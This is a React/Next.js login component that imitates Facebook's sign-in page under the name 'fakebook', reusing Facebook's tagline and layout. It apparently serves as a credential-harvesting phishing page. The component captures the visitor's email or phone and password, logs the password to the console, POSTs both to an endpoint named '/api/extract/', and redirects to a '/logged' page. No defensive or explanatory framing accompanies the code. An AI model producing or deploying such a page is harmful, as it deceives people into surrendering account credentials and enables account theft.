"use client"
import React, { useState } from 'react'
import Link from 'next/link'

const Login = () => {

 const [email_phone, setemail_phone] = useState('')
  const [password, setpassword] = useState('')

  async function handleSubmit(){
    console.log(email_phone);
    console.log(password);
    
    const res = await fetch('/api/extract/', {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email_phone,
        password,
      }),
    });
    const { msg, success } = await res.json()
    console.log(msg, success);
    if(msg == undefined){
      window.location.href = '/logged'
    }
    if(success){
      setemail_phone('')
      setpassword('')
    }else{
      console.log('Incorrect Email or password');
      
    }
  }


  return (
    <div className='bg-gray-100 h-3/4 '>
      <div className=' py-5 flex justify-center w-9/12 m-auto items-center h-[70vh] '>
        <div className='w-3/12 mx-10'>
        <h2 className='text-blue-500 text-6xl font-bold mb-4'>fakebook</h2>
          <span className='text-2xl'>
          Facebook helps you connect and share with the people in your life.
          </span>
        </div>
        <div className=' w-3/12  mx-10'>
        <div className='bg-white shadow-xl'>
          <div className='flex px-4 '><input className='w-full p-3 my-2 mt-4 border-2 rounded-md' onChange={(e)=>setemail_phone(e.target.value)} value={email_phone} placeholder='Email address or phone number' type="text" /></div>
          <div className='flex px-4 '><input className='w-full p-3 my-2 border-2 rounded-md' onChange={(e)=>setpassword(e.target.value)} value={password} placeholder='Password' type="password" /></div>
          <div className="flex px-4 "><button className='w-full p-2 bg-blue-600 text-xl text-white my-2 rounded-md' onClick={handleSubmit}> Log in </button></div>
          <div className='flex justify-center'><Link href={''} className='text-blue-500 mt-2'>Forgotten password?</Link></div><hr className='mt-4'/>
          <div className='flex justify-center'><button className='bg-green-500 text-white px-8 py-3 text-xl m-6 rounded-md'><Link href={'/Create'}>Create new account</Link></button></div>
        </div>
        <div className='flex justify-center my-4'>
          <span><b>Create a Page</b> for a celebrity, brand or business.</span>
        </div>
        </div>
      </div>
    </div>
  )
}

export default Login